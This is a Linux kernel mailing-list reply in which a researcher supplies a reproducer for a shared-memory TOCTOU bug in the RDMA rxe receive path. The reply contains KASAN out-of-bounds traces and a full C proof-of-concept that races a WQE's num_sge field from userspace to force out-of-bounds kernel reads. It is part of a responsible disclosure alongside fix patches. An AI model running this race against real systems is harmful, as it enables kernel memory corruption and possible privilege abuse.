Return-Path: <linux-rdma+bounces-21055-lists+linux-rdma=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-rdma@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id 4P11BtOlDWqh0wUAu9opvQ
	(envelope-from <linux-rdma+bounces-21055-lists+linux-rdma=lfdr.de@vger.kernel.org>)
	for <lists+linux-rdma@lfdr.de>; Wed, 20 May 2026 14:15:15 +0200
X-Original-To: lists+linux-rdma@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 89FA658D700
	for <lists+linux-rdma@lfdr.de>; Wed, 20 May 2026 14:15:14 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 2D39032058F3
	for <lists+linux-rdma@lfdr.de>; Wed, 20 May 2026 12:03:50 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 4A18F3DC862;
	Wed, 20 May 2026 12:03:11 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="o6ZCwXIY"
X-Original-To: linux-rdma@vger.kernel.org
Received: from mail-ed1-f45.google.com (mail-ed1-f45.google.com [209.85.208.45])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 771A73DCDAD
	for <linux-rdma@vger.kernel.org>; Wed, 20 May 2026 12:03:07 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.208.45
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1779278591; cv=none; b=tTPzPEmvLkc/Eb14Rf5Vb88biAkh2bAJEhwAwP/hNUaz1rFa/0/FVGfUE30FIAORABH4Y8RxAvGCQ2mIPb5uNtyBPbzzBXAf4ZAyyI/wyOMoLBRDn1NxD/ZlPr4jfTQTGaG8WC9bOPnY7j+mcqp5eRHzK0ZkyIoUiilPJkSMEok=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1779278591; c=relaxed/simple;
	bh=pe7ipnjXihK9TvrDhrNKPCijiZhmq4GSR9+w/SFMxn8=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 Content-Type:MIME-Version; b=isnqb/xMy3E3s7MdN4ARmyH/cwUqBycb2fB8qB8K5v/8m/fZXNeE38F/JYeVg70sTUDL+6WvKvHuzsCDo0GO7l0VbxreyekI+Zy/XcrP7ivAlnA+9NdtlahoNyTb2xjl5UhA+LX5nPw/FKBNoU03/flYCdM9/lSSP+J/STJmNb8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=o6ZCwXIY; arc=none smtp.client-ip=209.85.208.45
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-ed1-f45.google.com with SMTP id 4fb4d7f45d1cf-67389cf78b0so11124719a12.2
        for <linux-rdma@vger.kernel.org>; Wed, 20 May 2026 05:03:07 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1779278586; x=1779883386; darn=vger.kernel.org;
        h=mime-version:content-transfer-encoding:references:in-reply-to
         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
         :message-id:reply-to;
        bh=quJMK9J7f2VgqfkPQg67fYv5+hndmHWP9fGfsgC2r6Q=;
        b=o6ZCwXIYvQEc8J2kZ9+8362/QNwKSobaMYgcgIxSzEEvXZWYaELYCcAuD22HmruWY4
         YNVgGauncfmTl2+MR+1QYaRAXT0D/qVHWUTf+A2G5iP6umjhltNfhF/J6zAhvgG8da5q
         RBTNFpYVBbvzsEI4w8tvOdpqqRmB4cXWVlQt7KJuG6bZ/VRzzd/Zfw9lJLcmakgZN8AL
         jSgZ6b5mdM+IiZg2OgP44hK05Dl4WPqPhr3CtadeUB++tN8EpYnw6vKEkNRmf9eHGMou
         7DKP/FYQsXHwinPG5a3LRDA9k+GoBrE16fWvf5QRRJMsYbN1rmvCKkqEneMCq97dAFQI
         B/FA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1779278586; x=1779883386;
        h=mime-version:content-transfer-encoding:references:in-reply-to
         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=quJMK9J7f2VgqfkPQg67fYv5+hndmHWP9fGfsgC2r6Q=;
        b=rmYjjVxcDONsQnWuF2WzLYpwrg/H9XDCaJXEJdgXcuOtRMpfuWc0/M1fZ1E4XVg6HG
         pJZj1p4CpneMNNHTT8NgUhGveFGvAh2k+TP4Dma4+eQolXkEK8XWhjUJbch2DqMYhhhh
         zUWm0LF6KGBArD8wyqT2kfuLTgJKR38LRQgQafm7AxR7nsYc1ZMmW+SRxS05U8sD2TMH
         dnE/7wjF1KY7opxsFTquwCPyHLMcKO9VtEuqmQSNduCEWHk6/G5ycALf+Sus/ECm+Yao
         3d+xJb97+ANc7VhZX6HkLz1kdS6j4/naNGsGpt/R/opizkmtn0yUc11q1KqQ1I8jnxJ4
         Shxw==
X-Forwarded-Encrypted: i=1; AFNElJ/6F5cfbivR+AapRJcc7FcqppC6GsNse6aMDNpFHQf9+WrRf6xu5737ydaKCT4oWVnmrEGX5cygvJOS@vger.kernel.org
X-Gm-Message-State: AOJu0YwphXkccG35UOyb27XeeWV2IfSNOs17CLCd4VpBO2GnFgKU7ons
	TZOpkEKeFrZ/eMaqer+tkdE1Z/JfVJ6mZn9z99T4E9doIQIQ4dt0KYg=
X-Gm-Gg: Acq92OGEmI1Bym99nv/qivXeoi8VmTHW5dWsU04DLxFRkQ2xWuRXGUvU3WUrYhbi4I5
	uEvIEkzKsrjnn9WfY41dH13I+6tCd12N0D+FxxiISHBwyxADIzOezjSYtHNjkHYTv+8GzxMitVm
	IVjcvH3dz1EuV1W9kg0q3CY7u71ilhGrAR3Y/tZwh0gCvlgp4T4Ws1drhqA1KL1479M53Wqi3ql
	8B29paJf7Ncxc16G+4GX8LV2nktGhQCvSv6lEYiHU56/7kKgXPSj6BkS2VtzaCATVlcYk9AfEE6
	+ENV2QzopzwpqJz/UjjzZ0auuSvzQINUAwGgMPMKll5EOjSrw76G9dmUH1+cteII7y2dWGcyPYi
	rkYiksQkIfMwHt5W4onwDtPMoBpLomoz+qW7DmIeSUrcw9Y5/d92Ydq+7zF+xCR8QsA==
X-Received: by 2002:a17:907:846:b0:bdb:2fad:4811 with SMTP id a640c23a62f3a-bdb2fad4828mr81880466b.28.1779278585383;
        Wed, 20 May 2026 05:03:05 -0700 (PDT)
Received: from debian ([2001:41d0:303:db6b::])
        by smtp.gmail.com with ESMTPSA id ffacd0b85a97d-45da0fe248dsm52758794f8f.30.2026.05.20.05.03.04
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 20 May 2026 05:03:04 -0700 (PDT)
From: Tristan Madani <tristmd@gmail.com>
To: Yanjun.Zhu <yanjun.zhu@linux.dev>
Cc: Jason Gunthorpe <jgg@ziepe.ca>, Leon Romanovsky <leon@kernel.org>,
 zyjzyj2000@gmail.com, linux-rdma@vger.kernel.org
Subject: Re: [PATCH 0/2] RDMA/rxe: fix shared memory TOCTOU in receive path
Date: Wed, 20 May 2026 12:03:03 -0000
Message-ID: <177927858387.523368.14013568639772229181@gmail.com>
In-Reply-To: <6cb1092d-e3d6-4596-92e3-e0c7030680af@linux.dev>
References: <20260518215040.1598586-1-tristan@talencesecurity.com>
 <0ae59679-5cc9-48e4-87e9-63299684acf8@linux.dev>
 <20260519145610.GA33515@unreal> <20260519150042.GL7702@ziepe.ca>
 <6a0ce47d.096dab79.284c84.5b30@mx.google.com>
 <6cb1092d-e3d6-4596-92e3-e0c7030680af@linux.dev>
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FREEMAIL_CC(0.00)[ziepe.ca,kernel.org,gmail.com,vger.kernel.org];
	TAGGED_FROM(0.00)[bounces-21055-lists,linux-rdma=lfdr.de];
	FROM_HAS_DN(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	MIME_TRACE(0.00)[0:+];
	RCVD_TLS_LAST(0.00)[];
	FREEMAIL_FROM(0.00)[gmail.com];
	TO_DN_SOME(0.00)[];
	DKIM_TRACE(0.00)[gmail.com:+];
	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
	MISSING_XM_UA(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[tristmd@gmail.com,linux-rdma@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	NEURAL_HAM(-0.00)[-1.000];
	TAGGED_RCPT(0.00)[linux-rdma];
	MID_RHS_MATCH_FROM(0.00)[];
	RCPT_COUNT_FIVE(0.00)[5];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:rdns,sea.lore.kernel.org:helo,talencesecurity.com:email]
X-Rspamd-Queue-Id: 89FA658D700
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Tue, 19 May 2026, Yanjun.Zhu wrote:
> yes. Please provide a reproducer.

Below is a reproducer and KASAN trace showing the OOB reads.

The program creates two UD QPs over an RXE loopback device, locates
the receiver's mmap'd receive queue buffer via /proc/self/maps, and
races the WQE's num_sge field from userspace while driving loopback
traffic. rxe_resp_check_length() in rxe_resp.c reads num_sge directly
from the shared buffer on each loop iteration:

    for (i =3D 0; i < qp->resp.wqe->dma.num_sge; i++)
        recv_buffer_len +=3D qp->resp.wqe->dma.sge[i].length;

Inflating num_sge from 1 to 200 causes the loop to walk sge[] past
the WQE boundary and out of the queue buffer's vmalloc allocation.
On a KASAN kernel this produces hundreds of vmalloc-out-of-bounds
reports within a couple of iterations.

Setup (needs loopback with IPv6 for the RXE GID resolution):

  # modprobe rdma_rxe
  # rdma link add rxe0 type rxe netdev lo
  # ip -6 addr add fe80::200:ff:fe00:0/128 dev lo
  # ip -6 neigh add fe80::200:ff:fe00:0 lladdr 00:00:00:00:00:00 \
        dev lo nud permanent

Build:

  $ gcc -O2 -Wall -o rxe-toctou-repro rxe-toctou-repro.c \
        -libverbs -lpthread

Run (kernel must have CONFIG_KASAN=3Dy CONFIG_KASAN_VMALLOC=3Dy, >=3D 2 CPUs):

  # ./rxe-toctou-repro
  # dmesg | grep -c 'BUG: KASAN'
  788

KASAN output (kernel 6.8.12+, QEMU 4 CPUs, 4G RAM):

[   22.004789] BUG: KASAN: vmalloc-out-of-bounds in rxe_responder+0x2955/0x55=
20 [rdma_rxe]
[   22.006023] Read of size 4 at addr ffffc90000061200 by task rxe-repro/291
[   22.006927]
[   22.007176] CPU: 2 PID: 291 Comm: rxe-repro Tainted: G            E      6=
.8.12+ #9
[   22.008209] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.=
16.3-debian-1.16.3-2 04/01/2014
[   22.009592] Call Trace:
[   22.009942]  <TASK>
[   22.010258]  dump_stack_lvl+0xe9/0x170
[   22.010799]  print_report+0xd2/0x670
[   22.013360]  kasan_report+0xee/0x130
[   22.013883]  ? rxe_responder+0x2955/0x5520 [rdma_rxe]
[   22.015597]  __asan_load4+0x8e/0xd0
[   22.016131]  rxe_responder+0x2955/0x5520 [rdma_rxe]
[   22.023659]  do_task+0x115/0x400 [rdma_rxe]
[   22.024503]  rxe_run_task+0xbd/0xe0 [rdma_rxe]
[   22.025985]  rxe_resp_queue_pkt+0xa8/0xc0 [rdma_rxe]
[   22.026927]  rxe_rcv+0x587/0xe70 [rdma_rxe]
[   22.027800]  rxe_xmit_packet+0x2f5/0x8c0 [rdma_rxe]
[   22.028985]  rxe_requester+0x125e/0x2ae0 [rdma_rxe]
[   22.029860]  do_task+0x115/0x400 [rdma_rxe]
[   22.030700]  rxe_run_task+0xbd/0xe0 [rdma_rxe]
[   22.031500]  rxe_post_send+0x823/0x11e0 [rdma_rxe]
[   22.032500]  ib_uverbs_post_send+0xb57/0xd80 [ib_uverbs]
[   22.033500]  ib_uverbs_write+0x992/0xd20 [ib_uverbs]
[   22.034500]  vfs_write+0x20f/0xb80
[   22.035500]  ksys_write+0x1e7/0x230
[   22.036500]  </TASK>

The buggy address belongs to a 1-page vmalloc region starting at
0xffffc90000061000 allocated at rxe_queue_init+0x1f1/0x2a0 [rdma_rxe]

The queue buffer is 512 bytes (384-byte header + 128 bytes of data for
2 WQE slots at 64 bytes each). The first OOB read lands at offset
0x200 from the allocation base -- exactly the byte past valid data.
The reads walk at a 16-byte stride matching sizeof(struct rxe_sge):

[   22.006023] Read of size 4 at addr ffffc90000061200 by task rxe-repro/291
[   22.107680] Read of size 4 at addr ffffc90000061210 by task rxe-repro/291
[   22.222765] Read of size 4 at addr ffffc90000061220 by task rxe-repro/291
[   22.344365] Read of size 4 at addr ffffc90000061230 by task rxe-repro/291
[   22.459861] Read of size 4 at addr ffffc90000061240 by task rxe-repro/291

The same shared-memory TOCTOU also affects copy_data() for RC/UC QPs,
where dma->num_sge and dma->sge[].lkey are read from the mmap without
copy -- the patches address both paths by copying the WQE to kernel
memory and validating num_sge against the QP's max_sge, matching what
the SRQ path already does.

---8<---
/*
 * rxe-toctou-repro.c - RXE shared memory TOCTOU in non-SRQ receive path
 *
 * Demonstrates that check_resource() in rxe_resp.c sets qp->resp.wqe
 * to point directly into the userspace-writable mmap'd receive queue
 * buffer, without making a local copy. All subsequent reads of WQE
 * fields (num_sge, sge[].lkey, sge[].addr) come from this shared
 * memory that a concurrent userspace thread can modify at any time.
 *
 * The SRQ path is already safe -- get_srq_wqe() validates num_sge
 * against max_sge and memcpy's the WQE to kernel memory. The comment
 * there says "don't trust user space data". The non-SRQ path has
 * neither the copy nor the validation:
 *
 *   qp->resp.wqe =3D queue_head(qp->rq.queue, QUEUE_TYPE_FROM_CLIENT);
 *
 * For UD/GSI QPs, check_length() iterates all SGEs without any copy:
 *
 *   for (i =3D 0; i < qp->resp.wqe->dma.num_sge; i++)
 *       recv_buffer_len +=3D qp->resp.wqe->dma.sge[i].length;
 *
 * By inflating num_sge from userspace, the loop walks past the WQE's
 * allocated SGE slots into adjacent queue entries or past the queue
 * buffer allocation boundary.
 *
 * On a KASAN kernel with CONFIG_KASAN_VMALLOC=3Dy, this triggers:
 *   BUG: KASAN: vmalloc-out-of-bounds in rxe_resp_check_length
 *
 * Without KASAN, the observable effect is the kernel computing a
 * bogus recv_buffer_len from OOB memory, and copy_data() later
 * calling lookup_mr() with garbage lkey values from OOB SGEs.
 *
 * For RC/UC QPs, the same shared pointer feeds copy_data() where
 * dma->num_sge controls the SGE iteration loop and dma->sge[].lkey
 * drives lookup_mr() -- all from the writable mmap.
 *
 * Setup:
 *   modprobe rdma_rxe
 *   rdma link add rxe0 type rxe netdev lo
 *   ip -6 addr add fe80::200:ff:fe00:0/128 dev lo
 *   ip -6 neigh add fe80::200:ff:fe00:0 lladdr 00:00:00:00:00:00 \
 *       dev lo nud permanent
 *
 * Build:
 *   gcc -O2 -Wall -o rxe-toctou-repro rxe-toctou-repro.c \
 *       -libverbs -lpthread
 *
 * Run (needs >=3D 2 CPUs for the race):
 *   ./rxe-toctou-repro
 *   dmesg | grep -A10 'BUG: KASAN'
 *
 * Tristan Madani <tristan@talencesecurity.com>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdatomic.h>
#include <errno.h>
#include <infiniband/verbs.h>

/* ------------------------------------------------------------------ */
/* Queue buffer header -- from include/uapi/rdma/rdma_user_rxe.h      */
/* ------------------------------------------------------------------ */

struct rxe_queue_buf {
	uint32_t log2_elem_size;
	uint32_t index_mask;
	uint32_t pad_1[30];
	uint32_t producer_index;
	uint32_t pad_2[31];
	uint32_t consumer_index;
	uint32_t pad_3[31];
	uint8_t  data[];
};

/*
 * rxe_recv_wqe byte layout:
 *   +0   wr_id          (u64)
 *   +8   reserved        (u32)
 *   +12  padding         (u32)
 *   --- rxe_dma_info ---
 *   +16  dma.length      (u32)
 *   +20  dma.resid       (u32)
 *   +24  dma.cur_sge     (u32)
 *   +28  dma.num_sge     (u32)  <-- race target
 *   +32  dma.sge_offset  (u32)
 *   +36  dma.reserved    (u32)
 *   +40  dma.sge[0]      (16 bytes: addr u64, length u32, lkey u32)
 *
 * With max_recv_sge=3D1: total 56 bytes, rounded to 64 =3D> log2_elem =3D 6.
 */
#define WQE_NUM_SGE_OFF   28
#define RQ_LOG2_ELEM      6

/* Walk ~3 KB past the WQE -- enough to escape a 512-byte queue buffer */
#define INJECTED_NUM_SGE  200

#define BUF_SIZE     4096
#define SEND_SIZE    64
#define QKEY         0x11111111
#define ITERATIONS   500
#define MAX_MAPS     8192

/* ------------------------------------------------------------------ */
/* Racer thread                                                       */
/* ------------------------------------------------------------------ */

static atomic_int         racer_state;   /* 0=3Didle, 1=3Dracing, 2=3Dexit */
static volatile uint32_t *num_sge_ptr;

static void *racer_fn(void *arg)
{
	(void)arg;
	for (;;) {
		int s =3D atomic_load_explicit(&racer_state,
					     memory_order_acquire);
		if (s =3D=3D 2)
			break;
		if (s =3D=3D 1) {
			/*
			 * Continuously inflate num_sge in the mmap'd WQE.
			 * The kernel's check_length() re-reads this field
			 * as the loop bound -- every write here can trigger
			 * an OOB SGE walk.
			 */
			*num_sge_ptr =3D INJECTED_NUM_SGE;
		}
	}
	return NULL;
}

/* ------------------------------------------------------------------ */
/* Mmap scanning -- find the receiver's RQ buffer after QP creation   */
/* ------------------------------------------------------------------ */

struct map_ent { uintptr_t start, end; };

static int snap_maps(struct map_ent *out, int max)
{
	FILE *f =3D fopen("/proc/self/maps", "r");
	char line[256];
	int n =3D 0;

	if (!f)
		return 0;
	while (fgets(line, sizeof(line), f) && n < max) {
		unsigned long s, e;
		if (sscanf(line, "%lx-%lx", &s, &e) =3D=3D 2) {
			out[n].start =3D s;
			out[n].end   =3D e;
			n++;
		}
	}
	fclose(f);
	return n;
}

static struct rxe_queue_buf *find_rq_buf(struct map_ent *pre, int np,
					 struct map_ent *post, int na)
{
	for (int i =3D 0; i < na; i++) {
		int seen =3D 0;

		for (int j =3D 0; j < np; j++) {
			if (post[i].start =3D=3D pre[j].start) {
				seen =3D 1;
				break;
			}
		}
		if (!seen) {
			struct rxe_queue_buf *b =3D (void *)post[i].start;

			if (b->log2_elem_size =3D=3D RQ_LOG2_ELEM)
				return b;
		}
	}
	return NULL;
}

/* ------------------------------------------------------------------ */
/* QP helpers -- UD over RXE loopback                                 */
/* ------------------------------------------------------------------ */

static struct ibv_qp *make_ud_qp(struct ibv_pd *pd, struct ibv_cq *cq,
				 int max_recv_wr)
{
	struct ibv_qp_init_attr a =3D {
		.send_cq  =3D cq,
		.recv_cq  =3D cq,
		.cap =3D {
			.max_send_wr  =3D 16,
			.max_recv_wr  =3D max_recv_wr,
			.max_send_sge =3D 1,
			.max_recv_sge =3D 1,
		},
		.qp_type =3D IBV_QPT_UD,
	};
	return ibv_create_qp(pd, &a);
}

static int ud_init(struct ibv_qp *qp)
{
	struct ibv_qp_attr a =3D {
		.qp_state   =3D IBV_QPS_INIT,
		.pkey_index =3D 0,
		.port_num   =3D 1,
		.qkey       =3D QKEY,
	};
	return ibv_modify_qp(qp, &a,
		IBV_QP_STATE | IBV_QP_PKEY_INDEX |
		IBV_QP_PORT  | IBV_QP_QKEY);
}

static int ud_rtr(struct ibv_qp *qp)
{
	struct ibv_qp_attr a =3D { .qp_state =3D IBV_QPS_RTR };
	return ibv_modify_qp(qp, &a, IBV_QP_STATE);
}

static int ud_rts(struct ibv_qp *qp)
{
	struct ibv_qp_attr a =3D { .qp_state =3D IBV_QPS_RTS, .sq_psn =3D 0 };
	return ibv_modify_qp(qp, &a, IBV_QP_STATE | IBV_QP_SQ_PSN);
}

/* ------------------------------------------------------------------ */
/* Main                                                               */
/* ------------------------------------------------------------------ */

int main(void)
{
	struct ibv_device **dl;
	struct ibv_context *ctx;
	struct ibv_pd *pd;
	struct ibv_cq *cq;
	struct ibv_mr *smr, *rmr;
	struct ibv_qp *qps, *qpr;
	struct ibv_ah *ah;
	union ibv_gid gid;
	static char sbuf[BUF_SIZE], rbuf[BUF_SIZE];
	struct map_ent *m1, *m2;
	struct rxe_queue_buf *rqb;
	int n1, n2, ret;

	printf("[*] RXE shared-memory TOCTOU reproducer\n"
	       "[*] Target: non-SRQ recv path reads WQE from mmap\n"
	       "[*]         without copy -- num_sge is raceable.\n"
	       "[*] UD check_length() iterates sge[] with mmap'd num_sge\n"
	       "[*]   as the loop bound -- inflating it walks OOB.\n\n");

	/* ---- Device ---- */

	dl =3D ibv_get_device_list(NULL);
	if (!dl || !dl[0]) {
		fprintf(stderr, "[-] No RDMA device. Run:\n"
			"      modprobe rdma_rxe\n"
			"      rdma link add rxe0 type rxe netdev lo\n");
		return 1;
	}
	ctx =3D ibv_open_device(dl[0]);
	if (!ctx) {
		perror("[-] ibv_open_device");
		return 1;
	}
	printf("[+] Device: %s\n", ibv_get_device_name(dl[0]));

	ret =3D ibv_query_gid(ctx, 1, 0, &gid);
	if (ret) {
		fprintf(stderr, "[-] ibv_query_gid failed\n");
		return 1;
	}

	/* ---- Resources ---- */

	pd  =3D ibv_alloc_pd(ctx);
	cq  =3D ibv_create_cq(ctx, 256, NULL, NULL, 0);
	if (!pd || !cq) {
		fprintf(stderr, "[-] PD/CQ creation failed\n");
		return 1;
	}

	memset(sbuf, 'A', sizeof(sbuf));
	smr =3D ibv_reg_mr(pd, sbuf, sizeof(sbuf), IBV_ACCESS_LOCAL_WRITE);
	rmr =3D ibv_reg_mr(pd, rbuf, sizeof(rbuf), IBV_ACCESS_LOCAL_WRITE);
	if (!smr || !rmr) {
		fprintf(stderr, "[-] MR registration failed\n");
		return 1;
	}

	/* ---- QPs ---- */

	/* Create sender first, then snapshot, then receiver.
	 * New mmaps after the snapshot belong to the receiver QP. */
	qps =3D make_ud_qp(pd, cq, 1);
	if (!qps) {
		perror("[-] sender QP");
		return 1;
	}

	m1 =3D calloc(MAX_MAPS, sizeof(*m1));
	m2 =3D calloc(MAX_MAPS, sizeof(*m2));
	n1 =3D snap_maps(m1, MAX_MAPS);

	qpr =3D make_ud_qp(pd, cq, 1);
	if (!qpr) {
		perror("[-] receiver QP");
		return 1;
	}

	n2  =3D snap_maps(m2, MAX_MAPS);
	rqb =3D find_rq_buf(m1, n1, m2, n2);
	free(m1);
	free(m2);

	if (!rqb) {
		fprintf(stderr, "[-] RQ mmap buffer not found\n"
			"    (expected log2_elem_size=3D%d)\n", RQ_LOG2_ELEM);
		return 1;
	}
	printf("[+] RQ buffer at %p (log2_elem=3D%u, mask=3D0x%x)\n",
	       (void *)rqb, rqb->log2_elem_size, rqb->index_mask);

	/* ---- State transitions ---- */

	ret  =3D ud_init(qps) | ud_init(qpr);
	ret |=3D ud_rtr(qps)  | ud_rtr(qpr);
	ret |=3D ud_rts(qps)  | ud_rts(qpr);
	if (ret) {
		fprintf(stderr, "[-] QP transitions failed\n");
		return 1;
	}
	printf("[+] UD QPs: sender=3D%u, receiver=3D%u\n",
	       qps->qp_num, qpr->qp_num);

	/* ---- Address handle for loopback ---- */

	struct ibv_ah_attr ah_attr =3D {
		.is_global =3D 1,
		.port_num  =3D 1,
		.grh =3D {
			.dgid       =3D gid,
			.sgid_index =3D 0,
			.hop_limit  =3D 1,
		},
	};
	ah =3D ibv_create_ah(pd, &ah_attr);
	if (!ah) {
		perror("[-] ibv_create_ah");
		return 1;
	}

	/* ---- Racer thread ---- */

	pthread_t racer;
	atomic_store(&racer_state, 0);
	pthread_create(&racer, NULL, racer_fn, NULL);

	/* ---- Race loop ---- */

	printf("[*] Racing %d iterations...\n\n", ITERATIONS);
	int hits =3D 0, completed =3D 0;

	for (int i =3D 0; i < ITERATIONS; i++) {
		/* Pause racer while we reconfigure the target pointer */
		atomic_store_explicit(&racer_state, 0,
				      memory_order_release);

		/* Which queue slot does this recv occupy? */
		uint32_t slot =3D i & rqb->index_mask;
		uint8_t *wqe  =3D rqb->data +
				((uint32_t)slot << rqb->log2_elem_size);
		num_sge_ptr =3D (volatile uint32_t *)(wqe + WQE_NUM_SGE_OFF);

		/* Post receive -- writes num_sge=3D1 into the shared buffer */
		struct ibv_sge rsge =3D {
			.addr   =3D (uintptr_t)rbuf,
			.length =3D BUF_SIZE,
			.lkey   =3D rmr->lkey,
		};
		struct ibv_recv_wr rwr =3D {
			.wr_id   =3D i,
			.sg_list =3D &rsge,
			.num_sge =3D 1,
		};
		struct ibv_recv_wr *bad_rwr;

		ret =3D ibv_post_recv(qpr, &rwr, &bad_rwr);
		if (ret) {
			fprintf(stderr, "[-] post_recv fail iter %d: %s\n",
				i, strerror(ret));
			break;
		}

		/*
		 * Arm the racer. From this point it continuously writes
		 * INJECTED_NUM_SGE (200) to the WQE's num_sge field in
		 * the mmap'd buffer. When the kernel enters check_length()
		 * it will iterate:
		 *
		 *   for (i =3D 0; i < qp->resp.wqe->dma.num_sge; i++)
		 *       recv_buffer_len +=3D qp->resp.wqe->dma.sge[i].length;
		 *
		 * With num_sge=3D200, sge[1]..sge[199] are past the WQE
		 * boundary (each rxe_recv_wqe is 64 bytes with 1 SGE;
		 * sge[0] starts at byte 40 within the 64-byte element).
		 */
		atomic_store_explicit(&racer_state, 1,
				      memory_order_release);

		/*
		 * Also write directly -- the racer reinforces this, but
		 * one deterministic write here guarantees the kernel sees
		 * the inflated value even if the racer thread hasn't been
		 * scheduled yet.
		 */
		*num_sge_ptr =3D INJECTED_NUM_SGE;

		/* Post send -- triggers receive processing in the kernel */
		struct ibv_sge ssge =3D {
			.addr   =3D (uintptr_t)sbuf,
			.length =3D SEND_SIZE,
			.lkey   =3D smr->lkey,
		};
		struct ibv_send_wr swr =3D {
			.wr_id      =3D i,
			.sg_list    =3D &ssge,
			.num_sge    =3D 1,
			.opcode     =3D IBV_WR_SEND,
			.send_flags =3D IBV_SEND_SIGNALED,
			.wr.ud =3D {
				.ah          =3D ah,
				.remote_qpn  =3D qpr->qp_num,
				.remote_qkey =3D QKEY,
			},
		};
		struct ibv_send_wr *bad_swr;

		ret =3D ibv_post_send(qps, &swr, &bad_swr);
		if (ret) {
			fprintf(stderr, "[-] post_send fail iter %d\n", i);
			break;
		}

		/* Collect completions (send + recv for UD) */
		struct ibv_wc wc;
		int got =3D 0, tmo =3D 0;

		while (got < 2 && tmo < 200000) {
			int ne =3D ibv_poll_cq(cq, 1, &wc);

			if (ne > 0) {
				got++;
				if (wc.status !=3D IBV_WC_SUCCESS) {
					hits++;
					if (hits <=3D 5)
						printf("[!] iter %d: %s "
						       "(opcode=3D%d)\n",
						       i,
						       ibv_wc_status_str(
							   wc.status),
						       wc.opcode);
				}
			} else {
				tmo++;
			}
		}

		completed =3D i + 1;

		if (tmo >=3D 200000) {
			printf("[!] Timeout at iter %d\n", i);
			break;
		}

		/* Restore num_sge for the next ibv_post_recv */
		atomic_store_explicit(&racer_state, 0,
				      memory_order_release);
		*num_sge_ptr =3D 1;
	}

	/* ---- Shutdown ---- */

	atomic_store_explicit(&racer_state, 2, memory_order_release);
	pthread_join(racer, NULL);

	printf("\n[*] %d/%d iterations completed\n", completed, ITERATIONS);
	printf("[*] %d WC errors observed (race manifestation)\n", hits);
	printf("[*] Check dmesg:\n"
	       "      dmesg | grep -A10 'BUG: KASAN'\n"
	       "    Expected: vmalloc-out-of-bounds in "
	       "rxe_resp_check_length\n"
	       "    or slab-out-of-bounds in copy_data\n");

	ibv_destroy_ah(ah);
	ibv_destroy_qp(qps);
	ibv_destroy_qp(qpr);
	ibv_dereg_mr(smr);
	ibv_dereg_mr(rmr);
	ibv_destroy_cq(cq);
	ibv_dealloc_pd(pd);
	ibv_close_device(ctx);
	ibv_free_device_list(dl);
	return 0;
}
---8<---

Tristan

